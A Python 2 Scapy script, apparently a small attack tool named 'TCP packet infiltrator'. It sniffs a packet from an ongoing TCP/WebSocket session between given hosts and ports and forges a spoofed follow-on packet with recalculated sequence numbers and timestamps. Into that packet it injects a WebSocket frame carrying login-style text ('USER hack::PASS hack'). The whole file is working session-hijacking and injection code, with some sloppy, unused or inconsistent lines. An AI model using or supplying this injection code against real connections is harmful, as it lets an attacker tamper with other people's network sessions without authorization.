#!/usr/bin/python
"""This script injects tcp packets into an ongoing websocket session to get informations to the
other side"""

import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import sys
import time
from scapy.all import *

VERSION = '0.1'

def hijack(p):
    """
    Function to manipulate the network packets

    """
    injection = b'USER hack::PASS hack\n'
    payload = '\x82' + chr(len(injection)) + injection

    if p[IP].src == src_ip and p[IP].dst == dst_ip:
        """ crafted payload """
        inj_data    = b'USER hac::PASS hacke\n'
        inj_len     = chr(len(inj_data))
        inj_payload = 'x82' + inj_len + inj_data

        """ethernet variables """
        ether_src   = p[Ether].src
        ether_dst   = p[Ether].dst
        ether_type  = p[Ether].type
        ethers       = Ether(dst=ether_dst, src=ether_src, type=ether_type)

        """ ip variables """
        ip_version  = p[IP].version
        ip_ihl      = p[IP].ihl
        ip_tos      = p[IP].tos
        ip_len      = 52 + len(payload)
        ip_id       = p[IP].id + +1
        ip_flags    = p[IP].flags
        ip_frag     = p[IP].frag
        ip_ttl      = p[IP].ttl
        ip_proto    = p[IP].proto
        ip_chksum   = p[IP].chksum - 1
        ip_src      = p[IP].src
        ip_dst      = p[IP].dst
        ip_options  = p[IP].options
        ips         = IP(version=ip_version, ihl=ip_ihl, tos=ip_tos, len=ip_len, id=ip_id, \
                         flags=ip_flags, frag=ip_frag, ttl=ip_ttl, proto=ip_proto, \
                         chksum=ip_chksum, src=ip_src, dst=ip_dst, options=ip_options)

        """ tcp variables """
        tcp_sport   = p[TCP].sport
        tcp_dport   = p[TCP].dport
        tcp_seq     = p[TCP].seq + len(payload)
        tcp_ack     = p[TCP].ack
        tcp_dataofs = p[TCP].dataofs
        tcp_flags   = p[TCP].flags # should be 'PA'
        tcp_window  = p[TCP].window
        tcp_chksum  = p[TCP].chksum
        tcp_urgptr  = p[TCP].urgptr
        tcp_options = [('NOP', None), ('NOP', None), ('Timestamp', \
                       (p[TCP].options[2][1][0] + len(payload), \
                        p[TCP].options[2][1][0]))]
        tcps        = TCP(sport=tcp_sport, dport=tcp_dport, seq=tcp_seq, ack=tcp_ack, \
                          dataofs=tcp_dataofs, flags=tcp_flags, window=tcp_window, \
                          chksum=tcp_chksum, urgptr=tcp_urgptr, options=tcp_options)

        """ raw variables """
        raw_load    = p[Raw].load

        if debug:
            print p.show()

        time.sleep(2)
        ether = Ether(dst=p[Ether].dst, src=p[Ether].src)
        ip = IP(src=p[IP].src, dst=p[IP].dst, ihl=p[IP].ihl, len=52+len(payload), flags=p[IP].flags, \
				frag=p[IP].frag, ttl=p[IP].ttl, proto=p[IP].proto, id=p[IP].id+1, \
                chksum=p[IP].chksum-1)
        tsval = p[TCP].options[2][1][0]+251
        tsecr = p[TCP].options[2][1][0]
        tcp = TCP(sport=p[TCP].sport, dport=p[TCP].dport, seq=p[TCP].seq+len(payload), \
                  ack=p[TCP].ack, dataofs=p[TCP].dataofs, reserved=p[TCP].reserved, flags="PA", \
                  window=p[TCP].window, options=TCP(str(TCP(options=[('NOP', None), \
                    ('NOP', None), ('Timestamp', (tsval, tsecr))]))).options)
        raw = Raw(load=p[Raw].load)
        #hijack = ether/ip/tcp/(payload)
        hijack = ethers/ips/tcps/(payload)
        #hijack = ether/ip/tcp/raw
        print hijack.show()
        rcv = sendp(hijack, iface='ens33')
        if debug:
            print 'RECEIVE: '
            print '==========================='
            print rcv

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='TCP packet infiltrator')
    parser.add_argument('-s', '--src', action='store', metavar='ip', required=True,
                        help='source ip address')
    parser.add_argument('-d', '--dst', action='store', metavar='ip', required=True,
                        help='destination ip address')
    parser.add_argument('--dport', action='store', metavar='port',
                        help='destination port')
    parser.add_argument('--sport', action='store', metavar='port',
                        help='source port')
    parser.add_argument('--debug', action='store_true', default=False,
                        help='debug output')
    parser.add_argument('--version', action='version', version='%(prog)s ' + VERSION)
    arg_vars = parser.parse_args()

    src_ip = arg_vars.src
    dst_ip = arg_vars.dst
    dst_port = arg_vars.dport
    src_port = arg_vars.sport
    debug = arg_vars.debug

    if src_port and dst_port:
        bpf_filter = 'tcp and src host ' + src_ip + ' and dst host ' + dst_ip + \
                ' and src port ' + src_port + ' and dst port ' + dst_port
    elif src_port:
        bpf_filter = 'tcp and src host ' + src_ip + ' and dst host ' + dst_ip + \
                ' and src port ' + src_port
    elif dst_port:
        bpf_filter = 'tcp and src host ' + src_ip + ' and dst host ' + dst_ip + \
                ' and dst port ' + dst_port
    else:
        print 'At least one port must be given!'
        sys.exit(1)

    if debug:
        print 'src ip    = ', src_ip
        print 'dst ip    = ', dst_ip
        print 'src port  = ', src_port
        print 'dst port  = ', dst_port
        print 'bpf filter= ', bpf_filter

    sniff(count=1, prn = lambda p: hijack(p), filter=bpf_filter, lfilter=lambda(f): f.haslayer(IP) \
          and f.haslayer(TCP) and f.haslayer(Ether) and f.haslayer(Raw))

